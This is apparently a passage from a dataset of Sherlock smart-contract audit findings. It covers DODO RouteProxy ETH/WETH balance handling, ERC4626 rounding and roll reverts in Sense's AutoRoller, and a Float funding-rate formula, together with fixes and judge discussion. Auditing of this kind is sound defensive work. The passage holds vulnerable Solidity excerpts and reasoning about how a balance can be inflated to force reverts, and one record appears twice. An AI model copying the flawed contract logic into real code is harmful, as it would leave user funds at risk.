= IERC20(toToken).universalBalanceOf(address(this));\n        } else {\n            toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n        }\n```\n"ч"Lack of logic to wrap the native ETH to WETH in function externalSwap\nThe function exeternalSwap can handle external swaps with 0x, 1inch and paraswap or other external resources.\n```\n    function externalSwap(\n        address fromToken,\n        address toToken,\n        address approveTarget,\n        address swapTarget,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        bytes memory feeData,\n        bytes memory callDataConcat,\n        uint256 deadLine\n    ) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {      \n        require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");  \n        require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");  \n\n        // transfer in fromToken\n        if (fromToken != _ETH_ADDRESS_) {\n            // approve if needed\n            if (approveTarget != address(0)) {\n                IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n            }\n\n            IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n                fromToken,\n                msg.sender,\n                address(this),\n                fromTokenAmount\n            );\n        }\n\n        // swap\n        uint256 toTokenOriginBalance;\n        if(toToken != _ETH_ADDRESS_) {\n            toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n        } else {\n            toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n        }\n```\n\nnote the code above, if the fromToken is set to _ETH_ADDRESS, indicating the user wants to trade with native ETH pair. the function does has payable modifier and user can send ETH along when calling this function.\nHowever, the toTokenOriginBalance is check the only WETH balance instead of ETH balance.\n```\n  if(toToken != _ETH_ADDRESS_) {\n      toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n  } else {\n      toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n  }\n```\n\nThen we do the swap:\n```\n(bool success, bytes memory result) = swapTarget.call{\n    value: fromToken == _ETH_ADDRESS_ ? fromTokenAmount : 0\n}(callDataConcat);\n```\n\nIf the fromToken is _ETH_ADDRESS, we send the user supplied fromTokenAmount without verifying that the fromTokenAmount.\nFinally, we use the before and after balance to get the amount with received.\n```\n// calculate toToken amount\n  if(toToken != _ETH_ADDRESS_) {\n      receiveAmount = IERC20(toToken).universalBalanceOf(address(this)) - (\n          toTokenOriginBalance\n      );\n  } else {\n      receiveAmount = IERC20(_WETH_).universalBalanceOf(address(this)) - (\n          toTokenOriginBalance\n      );\n  }\n```\n\nWe are checking the WETH amount instead of ETH amount again.\nThe issue is that some trades may settle the trade in native ETH, for example\nhttps://developers.paraswap.network/smart-contracts\nwe can look into the Paraswap contract\nhttps://etherscan.io/address/0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57#writeProxyContract\nIf we click the implementation contract and see the method swapOnUniswapV2Fork\nhttps://etherscan.io/address/0x4ff0dec5f9a763aa1e5c2a962aa6f4edfee4f9ea#code\nCode line 927 - 944, which calls the function\n```\nfunction swapOnUniswapV2Fork(\n address tokenIn,\n uint256 amountIn,\n uint256 amountOutMin,\n address weth,\n uint256[] calldata pools\n)\n external\n payable\n{\n _swap(\n  tokenIn,\n  amountIn,\n  amountOutMin,\n  weth,\n  pools\n );\n}\n```\n\nwhich calls:\n```\n  function _swap(\n        address tokenIn,\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address weth,\n        uint256[] memory pools\n    )\n        private\n        returns (uint256 tokensBought)\n    {\n        uint256 pairs = pools.length;\n\n        require(pairs != 0, ""At least one pool required"");\n\n        bool tokensBoughtEth;\n\n        if (tokenIn == ETH_IDENTIFIER) {\n            require(amountIn == msg.value, ""Incorrect msg.value"");\n            IWETH(weth).deposit{value: msg.value}();\n            require(IWETH(weth).transfer(address(pools[0]), msg.value));\n        } else {\n            require(msg.value == 0, ""Incorrect msg.value"");\n            transferTokens(tokenIn, msg.sender, address(pools[0]), amountIn);\n            tokensBoughtEth = weth != address(0);\n        }\n\n        tokensBought = amountIn;\n\n        for (uint256 i = 0; i < pairs; ++i) {\n            uint256 p = pools[i];\n            address pool = address(p);\n            bool direction = p & DIRECTION_FLAG == 0;\n\n            tokensBought = NewUniswapV2Lib.getAmountOut(\n                tokensBought, pool, direction, p  FEE_OFFSET\n            );\n            (uint256 amount0Out, uint256 amount1Out) = direction\n                ? (uint256(0), tokensBought) : (tokensBought, uint256(0));\n            IUniswapV2Pair(pool).swap(\n                amount0Out,\n                amount1Out,\n                i + 1 == pairs\n                    ? (tokensBoughtEth ? address(this) : msg.sender)\n                    : address(pools[i + 1]),\n                """"\n            );\n        }\n\n        if (tokensBoughtEth) {\n            IWETH(weth).withdraw(tokensBought);\n            TransferHelper.safeTransferETH(msg.sender, tokensBought);\n        }\n\n        require(tokensBought >= amountOutMin, ""UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT"");\n    }\n```\n\nas can clearly see, the code first receive ETH, wrap ETH to WETH, then instead end, unwrap the WETH to ETH and the send the ETH back to complete the trade.\n```\nif (tokensBoughtEth) {\n IWETH(weth).withdraw(tokensBought);\n TransferHelper.safeTransferETH(msg.sender, tokensBought);\n}\n```\n\nbut if we call swapOnUniswapV2Fork on Paraswap router, the balance change for WETH would be 0\nbecause as we see above, the method on paraswap side wrap ETH to WETH but in the end unwrap WETH and send ETH back.\nThere is also a lack of a method to wrap the ETH to WETH before the trade. making the ETH-related order not tradeable."ч"
Issue when handling native ETH trade and WETH trade in DODO RouterProxy#externalSwapчmediumч"```\n    function externalSwap(\n        address fromToken,\n        address toToken,\n        address approveTarget,\n        address swapTarget,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        bytes memory feeData,\n        bytes memory callDataConcat,\n        uint256 deadLine\n    ) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {      \n        require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");  \n        require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");  \n\n        // transfer in fromToken\n        if (fromToken != _ETH_ADDRESS_) {\n            // approve if needed\n            if (approveTarget != address(0)) {\n                IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n            }\n\n            IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n                fromToken,\n                msg.sender,\n                address(this),\n                fromTokenAmount\n            );\n        }\n\n        // swap\n        uint256 toTokenOriginBalance;\n        if(toToken != _ETH_ADDRESS_) {\n            toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n        } else {\n            toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n        }\n```\n"ч"Lack of logic to wrap the native ETH to WETH in function externalSwap\nThe function exeternalSwap can handle external swaps with 0x, 1inch and paraswap or other external resources.\n```\n    function externalSwap(\n        address fromToken,\n        address toToken,\n        address approveTarget,\n        address swapTarget,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        bytes memory feeData,\n        bytes memory callDataConcat,\n        uint256 deadLine\n    ) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {      \n        require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");  \n        require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");  \n\n        // transfer in fromToken\n        if (fromToken != _ETH_ADDRESS_) {\n            // approve if needed\n            if (approveTarget != address(0)) {\n                IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n            }\n\n            IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n                fromToken,\n                msg.sender,\n                address(this),\n                fromTokenAmount\n            );\n        }\n\n        // swap\n        uint256 toTokenOriginBalance;\n        if(toToken != _ETH_ADDRESS_) {\n            toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n        } else {\n            toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n        }\n```\n\nnote the code above, if the fromToken is set to _ETH_ADDRESS, indicating the user wants to trade with native ETH pair. the function does has payable modifier and user can send ETH along when calling this function.\nHowever, the toTokenOriginBalance is check the only WETH balance instead of ETH balance.\n```\n  if(toToken != _ETH_ADDRESS_) {\n      toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n  } else {\n      toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n  }\n```\n\nThen we do the swap:\n```\n(bool success, bytes memory result) = swapTarget.call{\n    value: fromToken == _ETH_ADDRESS_ ? fromTokenAmount : 0\n}(callDataConcat);\n```\n\nIf the fromToken is _ETH_ADDRESS, we send the user supplied fromTokenAmount without verifying that the fromTokenAmount.\nFinally, we use the before and after balance to get the amount with received.\n```\n// calculate toToken amount\n  if(toToken != _ETH_ADDRESS_) {\n      receiveAmount = IERC20(toToken).universalBalanceOf(address(this)) - (\n          toTokenOriginBalance\n      );\n  } else {\n      receiveAmount = IERC20(_WETH_).universalBalanceOf(address(this)) - (\n          toTokenOriginBalance\n      );\n  }\n```\n\nWe are checking the WETH amount instead of ETH amount again.\nThe issue is that some trades may settle the trade in native ETH, for example\nhttps://developers.paraswap.network/smart-contracts\nwe can look into the Paraswap contract\nhttps://etherscan.io/address/0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57#writeProxyContract\nIf we click the implementation contract and see the method swapOnUniswapV2Fork\nhttps://etherscan.io/address/0x4ff0dec5f9a763aa1e5c2a962aa6f4edfee4f9ea#code\nCode line 927 - 944, which calls the function\n```\nfunction swapOnUniswapV2Fork(\n address tokenIn,\n uint256 amountIn,\n uint256 amountOutMin,\n address weth,\n uint256[] calldata pools\n)\n external\n payable\n{\n _swap(\n  tokenIn,\n  amountIn,\n  amountOutMin,\n  weth,\n  pools\n );\n}\n```\n\nwhich calls:\n```\n  function _swap(\n        address tokenIn,\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address weth,\n        uint256[] memory pools\n    )\n        private\n        returns (uint256 tokensBought)\n    {\n        uint256 pairs = pools.length;\n\n        require(pairs != 0, ""At least one pool required"");\n\n        bool tokensBoughtEth;\n\n        if (tokenIn == ETH_IDENTIFIER) {\n            require(amountIn == msg.value, ""Incorrect msg.value"");\n            IWETH(weth).deposit{value: msg.value}();\n            require(IWETH(weth).transfer(address(pools[0]), msg.value));\n        } else {\n            require(msg.value == 0, ""Incorrect msg.value"");\n            transferTokens(tokenIn, msg.sender, address(pools[0]), amountIn);\n            tokensBoughtEth = weth != address(0);\n        }\n\n        tokensBought = amountIn;\n\n        for (uint256 i = 0; i < pairs; ++i) {\n            uint256 p = pools[i];\n            address pool = address(p);\n            bool direction = p & DIRECTION_FLAG == 0;\n\n            tokensBought = NewUniswapV2Lib.getAmountOut(\n                tokensBought, pool, direction, p  FEE_OFFSET\n            );\n            (uint256 amount0Out, uint256 amount1Out) = direction\n                ? (uint256(0), tokensBought) : (tokensBought, uint256(0));\n            IUniswapV2Pair(pool).swap(\n                amount0Out,\n                amount1Out,\n                i + 1 == pairs\n                    ? (tokensBoughtEth ? address(this) : msg.sender)\n                    : address(pools[i + 1]),\n                """"\n            );\n        }\n\n        if (tokensBoughtEth) {\n            IWETH(weth).withdraw(tokensBought);\n            TransferHelper.safeTransferETH(msg.sender, tokensBought);\n        }\n\n        require(tokensBought >= amountOutMin, ""UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT"");\n    }\n```\n\nas can clearly see, the code first receive ETH, wrap ETH to WETH, then instead end, unwrap the WETH to ETH and the send the ETH back to complete the trade.\n```\nif (tokensBoughtEth) {\n IWETH(weth).withdraw(tokensBought);\n TransferHelper.safeTransferETH(msg.sender, tokensBought);\n}\n```\n\nbut if we call swapOnUniswapV2Fork on Paraswap router, the balance change for WETH would be 0\nbecause as we see above, the method on paraswap side wrap ETH to WETH but in the end unwrap WETH and send ETH back.\nThere is also a lack of a method to wrap the ETH to WETH before the trade. making the ETH-related order not tradeable."ч"We recommend the project change from\n```\n  // swap\n  uint256 toTokenOriginBalance;\n  if(toToken != _ETH_ADDRESS_) {\n      toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n  } else {\n      toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n  }\n```\n\n```\n  // swap\n  uint256 toTokenOriginBalance;\n  if(toToken != _ETH_ADDRESS_) {\n      toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n  } else {\n      toTokenOriginBalance = IERC20(_ETH_ADDRESS).universalBalanceOf(address(this));\n  }\n```\n\nIf we want to use WETH to do the balance check, we can help the user wrap the ETH to WETH by calling before do the balance check.\n```\nIWETH(_WETH_).deposit(receiveAmount);\n```\n\nIf we want to use WETH as the reference to trade, we also need to approve external contract to spend our WETH.\nWe can add\n```\nif(fromToken == _ETH_ADDRESS) {\n   IERC20(_WETH_).universalApproveMax(approveTarget, fromTokenAmount);\n}\n```\n\nWe also need to verify the fromTokenAmount for\n```\n(bool success, bytes memory result) = swapTarget.call{\n    value: fromToken == _ETH_ADDRESS_ ? fromTokenAmount : 0\n}(callDataConcat);\n```\n\nwe can add the check:\n```\nrequire(msg.value == fromTokenAmount, ""invalid ETH amount"");\n```\n\nDiscussion\nAttens1423\nIn our api, we require toToken is WETH when contructing callData. We will add some notes here. Thanks for noticing\nEvert0x\nEven tough the API is requiring WETH we still think it's a valid issue as the contract has a payable modifier.\nAttens1423\nWe will add this check: require(msg.value == fromTokenAmount, ""invalid ETH amount""); As the fromToken is ETH, we won't deposit it into routeProxy, we will transfer the ETH amount directly.\nAttens1423\nhttps://github.com/DODOEX/dodo-route-contract/pull/2\naktech297\ncomments are added at the start of the function. Fixes are done as mentioned in, `We will add this check: require(msg.value == fromTokenAmount, ""invalid ETH amount"");`"чA lot of method that does not use WETH to settle the trade will not be callable.\nCode Snippet\nTool used\nManual Review
Math rounding in AutoRoller.sol is not ERC4626-complicant: previewWithdraw should round up.чmediumч```\n    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n```\nчPer EIP 4626's Security Considerations (https://eips.ethereum.org/EIPS/eip-4626)\nFinally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users:\nIf (1) it’s calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) it’s determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round down. If (1) it’s calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) it’s calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round up.\nThe original implementation for previewWithdraw in Solmate ERC4626 is:\n```\n    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n```\n\n```\nfor (uint256 i = 0; i < 20;) { // 20 chosen as a safe bound for convergence from practical trials.\n    if (guess > supply) {\n        guess = supply;\n    }\n\n    int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n\n    if (answer >= 0 && answer <= assets.mulWadDown(0.001e18).safeCastToInt() || (prevAnswer == answer)) { // Err on the side of overestimating shares needed. Could reduce precision for gas efficiency.\n        break;\n    }\n\n    if (guess == supply && answer < 0) revert InsufficientLiquidity();\n\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess  = guess;\n    prevAnswer = answer;\n    guess      = nextGuess;\n\n    unchecked { ++i; }\n}\n\nreturn guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n\nnote the line:\n```\n  int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n```\n\npreviewRedeem is round down.\nand later we update guess and return guess\n```\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess  = guess;\n    prevAnswer = answer;\n    guess      = nextGuess;\n```\n\nand\n```\n return guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n\nwhen calculating the the nextGuess, the code does not round up.\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n```\nч"Source: https://github.com/sherlock-audit/2022-11-sense-judging/issues/30\nFound by\nctf_sec\nRound up in previewWithdraw using mulDivUp and divWadUp\nDiscussion\njparklev\nOur understanding is that `nextGuess` does not need to be rounded up since it's just a ""guess"" that is confirmed or denied in how close the ""answer"" is to what we're looking for. So the rounding needs to be in the answer assessment stage.\nIn addition, as our comment in the answer inequality says, we do overestimate the shares needed, which is equivalent to rounding up. Perhaps one could make the case that the inequality should be `> 0` rather than `>= 0` so that exact matches from the rounded down `previewRedeem` don't make it through\nGiven the above, we're ok accepting this issue, but disagree with the severity\njparklev\nFix: https://github.com/sense-finance/auto-roller/pull/22\nEvert0x\n@jparklev What severity are you suggesting?\njparklev\n@jparklev What severity are you suggesting?\n`medium` would be our suggestion\naktech297\nVerified the fix. As @jparklev mentioned, `rounding needs to be in the answer assessment stage`, the fix is not related to rounding up. It is related to inequality. so, the fix is to check for `> 0` rather than `>= 0` so that exact matches from the rounded down `previewRedeem` don't make it through."чCode Snippet\nTool used\nManual Review
Funding Rate calculation is not correctчmediumч```\nuint256 totalFunding = (2 * overbalancedValue * fundingRateMultiplier * oracleManager.EPOCH_LENGTH()) / (365.25 days * 10000);\n```\nчAccording to the docs, the Funding Rate is intended to correspond to the gap between long and short positions that the Float Pool is required to make up. However, as its implemented, the `totalFunding` is calculated only on the size of the overbalanced position, leading to some unexpected situations.\nAccording to the comments, `totalFunding` is meant to be calculated as follows:\ntotalFunding is calculated on the notional of between long and short liquidity and 2x long and short liquidity.\nThis makes sense. The purpose of the funding rate is to compensate the Float Pool for the liquidity provided to balance the market.\nHowever, the implementation of this function does not accomplish this. Instead, `totalFunding` is based only on the size of the overbalancedValue:\n```\nuint256 totalFunding = (2 * overbalancedValue * fundingRateMultiplier * oracleManager.EPOCH_LENGTH()) / (365.25 days * 10000);\n```\n\nThis can be summarized as `2 * overbalancedValue * funding rate percentage * epochs / yr`.\nThis formula can cause problems, because the size of the overbalanced value doesn't necessarily correspond to the balancing required for the Float Pool.\nFor these examples, let's set:\n`fundingRateMultiplier = 100` (1%)\n`EPOCH_LENGTH() = 3.6525 days` (1% of a year)\nSITUATION A:\nOverbalanced: LONG\nLong Effective Liquidity: 1_000_000 ether\nShort Effective Liquidity: 999_999 ether\n`totalFunding = 2 * 1_000_000 ether * 1% * 1% = 200 ether`\nAmount of balancing supplied by Float = 1mm - 999,999 = 1 ether\nSITUATION B:\nOverbalanced: LONG\nLong Effective Liquidity: 1_000 ether\nShort Effective Liquidity: 100 ether\n`totalFunding = 2 * 1_000 ether * 1% * 1% = 0.2 ether`\nAmount of balancing supplied by Float = 1000 - 100 = 900 ether\nWe can see that in Situation B, Float supplied 900X more liquidity to the system, and earned 1000X less fees.чAdjust the `totalFunding` formula to represent the stated outcome. A simple example of how that might be accomplished is below, but I'm sure there are better implementations:\n```\nuint256 totalFunding = ((overbalancedValue - underbalancedValue) * fundingRateMultiplier * oracle.EPOCH_LENGTH()) / (365.25 days * 10_000);\n```\n\nDiscussion\nJasoonS\nIt is acknowledged that this funding rate equation is just a placeholder for now.\nThis typo of funding rate equation is desired if we want to incentivise market makers to always keep liquidity in the Float pool regardless of market balance.\nOur initial implementation was EXACTLY the same as what you wrote in the recommendation (and it is exactly what has been deployed live for the alpha version of the protocol for the last year). But after talks with market makers it became clear that they want 'guaranteed' returns of sorts even if the market is balanced to keep their funds there.\nWe have (since audit) refined an updated equation that is a hybrid of the two extremes. This is some of the core logic that we'll have to keep iterating on to make float work. It is the magic sauce.\nApologies for that mistake in the comments. The comments also say: `This modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.`\nTLDR - this is as intended and the shortcomings are known.\nEvert0x\nDowngrading to informational as the docs on which this issue is based also indicate that it's a placeholder. Issue doesn't make a case for med/high in case the formula makes it to production.\nzobront\nEscalate for 5 USDC\nIt seems like quite a stretch to claim that the current implementation is a placeholder. The exact quote in the docs is:\nThis modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.\nThis clearly states that the function is supposed to accomplish what they state it will accomplish. They acknowledge it may change, but specifically lay out what the function should do and claim that it does it.\nIf saying “this is right but may change somewhat” disqualifies valid issues, then anything that says that should not be in scope. So I feel it is very clear that the report does find a real issue in the code.\nNow, I understand that if this was just an issue with the docs, it’d be informational. That’s fair.\nBut the actual implementation isn’t an “alternative”. It’s a totally invalid way to implement the function that would cause harm to the platform.\nThe goal of the function is to ensure the Float pool is compensated for the real risk that it is taking on. If it is substantially underpaid (as it would be in many cases with the erroneous formula), it can easily cause the pool to lose funds. The formula doesn't accomplish the objective that is needed from it, and it puts the protocol's own funds at risk.\nThe fact that, since the audit, they have updated the equation seems to imply that they agree that the implementation in the audit code was untenable.\nSo it seems clear to me that: a) the issue is a real mismatch between explicitly intended behavior and the code b) it would cause real harm if it was deployed as written\nTherefore, I believe a severity of Medium is justified.\nsherlock-admin\nEscalate for 5 USDC\nIt seems like quite a stretch to claim that the current implementation is a placeholder. The exact quote in the docs is:\nThis modular function is logical but naive implementation that will likely change somewhat upon more indepth modelling results that are still pending.\nThis clearly states that the function is supposed to accomplish what they state it will accomplish. They acknowledge it may change, but specifically lay out what the function should do and claim that it does it.\nIf saying “this is right but may change somewhat” disqualifies valid issues, then anything that says that should not be in scope. So I feel it is very clear that the report does find a real issue in the code.\nNow, I understand that if this was just an issue with the docs, it’d be informational. That’s fair.\nBut the actual implementation isn’t an “alternative”. It’s a totally invalid way to implement the function that would cause harm to the platform.\nThe goal of the function is to ensure the Float pool is compensated for the real risk that it is taking on. If it is substantially underpaid (as it would be in many cases with the erroneous formula), it can easily cause the pool to lose funds. The formula doesn't accomplish the objective that is needed from it, and it puts the protocol's own funds at risk.\nThe fact that, since the audit, they have updated the equation seems to imply that they agree that the implementation in the audit code was untenable.\nSo it seems clear to me that: a) the issue is a real mismatch between explicitly intended behavior and the code b) it would cause real harm if it was deployed as written\nTherefore, I believe a severity of Medium is justified.\nYou've created a valid escalation for 5 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted.\nsherlock-admin\nEscalation accepted.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чFunding Rates will not accomplish the stated objective, and will serve to incentivize pools that rely heavily on Float for balancing, while disincentivizing large, balanced markets.\nCode Snippet\nTool used\nManual Review, Foundry
AutoRoller.sol#roll can revert if lastSettle is zero because solmate ERC4626 deposit revert if previewDeposit returns 0чmediumч```\n  /// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\n  function roll() external {\n      if (maturity != MATURITY_NOT_SET) revert RollWindowNotOpen();\n\n      if (lastSettle == 0) {\n          // If this is the first roll, lock some shares in by minting them for the zero address.\n          // This prevents the contract from reaching an empty state during future active periods.\n          deposit(firstDeposit, address(0));\n      } else if (lastSettle + cooldown > block.timestamp) {\n          revert RollWindowNotOpen();\n      }\n\n      lastRoller = msg.sender;\n      adapter.openSponsorWindow();\n  }\n```\nч"let us look into the implementation of function roll()\n```\n  /// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\n  function roll() external {\n      if (maturity != MATURITY_NOT_SET) revert RollWindowNotOpen();\n\n      if (lastSettle == 0) {\n          // If this is the first roll, lock some shares in by minting them for the zero address.\n          // This prevents the contract from reaching an empty state during future active periods.\n          deposit(firstDeposit, address(0));\n      } else if (lastSettle + cooldown > block.timestamp) {\n          revert RollWindowNotOpen();\n      }\n\n      lastRoller = msg.sender;\n      adapter.openSponsorWindow();\n  }\n```\n\nnote, if lastSettle is 0, we deposit a small amount of token and mint shares to address(0)\n```\ndeposit(firstDeposit, address(0));\n```\n\nFirst deposit is a fairly small amount:\n```\nfirstDeposit  = (0.01e18 - 1) / scalingFactor + 1;\n```\n\nWe can deposit from ERC4626 implementation:\n```\nfunction deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, ""ZERO_SHARES"");\n\n    // Need to transfer before minting or ERC777s could reenter.\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n}\n```\n\nnote the restriction:\n```\n// Check for rounding error since we round down in previewDeposit.\nrequire((shares = previewDeposit(assets)) != 0, ""ZERO_SHARES"");\n\n// Need to transfer before minting or ERC777s could reenter.\nasset.safeTransferFrom(msg.sender, address(this), assets);\n```\n\nif previewDeposit returns 0 shares, transaction revert. Can previewDeposit returns 0 shares? it is very possible.\n```\nfunction previewDeposit(uint256 assets) public view override returns (uint256) {\n    if (maturity == MATURITY_NOT_SET) {\n        return super.previewDeposit(assets);\n    } else {\n        Space _space = space;\n        (uint256 ptReserves, uint256 targetReserves) = _getSpaceReserves();\n\n        // Calculate how much Target we'll end up joining the pool with, and use that to preview minted LP shares.\n        uint256 previewedLPBal = (assets - _getTargetForIssuance(ptReserves, targetReserves, assets, adapter.scaleStored()))\n            .mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n        // Shares represent proportional ownership of LP shares the vault holds.\n        return previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n    }\n}\n```\n\nIf (previewedLPBal * total) / space balance is truncated to 0, transaction revert. _space.balanceOf can certainly be inflated if malicious actor send the space token to the address manually. Or previewedLPBal * total could just be small and the division is truncated to 0."чSource: https://github.com/sherlock-audit/2022-11-sense-judging/issues/33\nFound by\nctf_sec\nWe recommend the project not deposit a such small amount, or there could be a function that let admin gradually control how many tokens should we put in the first deposit.\nDiscussion\njparklev\nWhile this is an interesting observation and it got us thinking, we don't think that it's something to be concerned about for two reasons:\nroll would be unaffected since the deposit before roll happens during a cooldown period, where the `previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)))` line is never executed\n`previewedLPBal` is a function of total supply, so if `_space.balanceOf(address(this))` were made larger, so to would `previewedLPBal`\nWe aren't yet on 100% confidence here tho, so if there were to be a test case demonstrating a concrete example of how this could happen, it would be much appreciated 🙏\naktech297\nI believe if this needs to happen, user have to waste a large amount of fund to do it for no personal gain. I see the #41 has fix for this. Further adding, a simple test is needed to ensure the function flow to confirm when the else part would be executed. I don't see the actual flow from the explanation.\n```\n else {\n    Space _space = space;\n    (uint256 ptReserves, uint256 targetReserves) = _getSpaceReserves();\n\n    // Calculate how much Target we'll end up joining the pool with, and use that to preview minted LP shares.\n    uint256 previewedLPBal = (assets - _getTargetForIssuance(ptReserves, targetReserves, assets, adapter.scaleStored()))\n        .mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n    // Shares represent proportional ownership of LP shares the vault holds.\n    return previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n}\n```\nчcalling roll would revert and the new sponsored series cannot be started properly.\nCode Snippet\nTool used\nManual Review
AutoRoller.sol#roll can revert if lastSettle is zero because solmate ERC4626 deposit revert if previewDeposit returns 0чmediumч```\n  /// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\n  function roll() external {\n      if (maturity != MATURITY_NOT_SET) revert RollWindowNotOpen();\n\n      if (lastSettle == 0) {\n          // If this is the first roll, lock some shares in by minting them for the zero address.\n          // This prevents the contract from reaching an empty state during future active periods.\n          deposit(firstDeposit, address(0));\n      } else if (lastSettle + cooldown > block.timestamp) {\n          revert RollWindowNotOpen();\n      }\n\n      lastRoller = msg.sender;\n      adapter.openSponsorWindow();\n  }\n```\nч"let us look into the implementation of function roll()\n```\n  /// @notice Roll into the next Series if there isn't an active series and the cooldown period has elapsed.\n  function roll() external {\n      if (maturity != MATURITY_NOT_SET) revert RollWindowNotOpen();\n\n      if (lastSettle == 0) {\n          // If this is the first roll, lock some shares in by minting them for the zero address.\n          // This prevents the contract from reaching an empty state during future active periods.\n          deposit(firstDeposit, address(0));\n      } else if (lastSettle + cooldown > block.timestamp) {\n          revert RollWindowNotOpen();\n      }\n\n      lastRoller = msg.sender;\n      adapter.openSponsorWindow();\n  }\n```\n\nnote, if lastSettle is 0, we deposit a small amount of token and mint shares to address(0)\n```\ndeposit(firstDeposit, address(0));\n```\n\nFirst deposit is a fairly small amount:\n```\nfirstDeposit  = (0.01e18 - 1) / scalingFactor + 1;\n```\n\nWe can deposit from ERC4626 implementation:\n```\nfunction deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, ""ZERO_SHARES"");\n\n    // Need to transfer before minting or ERC777s could reenter.\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n}\n```\n\nnote the restriction:\n```\n// Check for rounding error since we round down in previewDeposit.\nrequire((shares = previewDeposit(assets)) != 0, ""ZERO_SHARES"");\n\n// Need to transfer before minting or ERC777s could reenter.\nasset.safeTransferFrom(msg.sender, address(this), assets);\n```\n\nif previewDeposit returns 0 shares, transaction revert. Can previewDeposit returns 0 shares? it is very possible.\n```\nfunction previewDeposit(uint256 assets) public view override returns (uint256) {\n    if (maturity == MATURITY_NOT_SET) {\n        return super.previewDeposit(assets);\n    } else {\n        Space _space = space;\n        (uint256 ptReserves, uint256 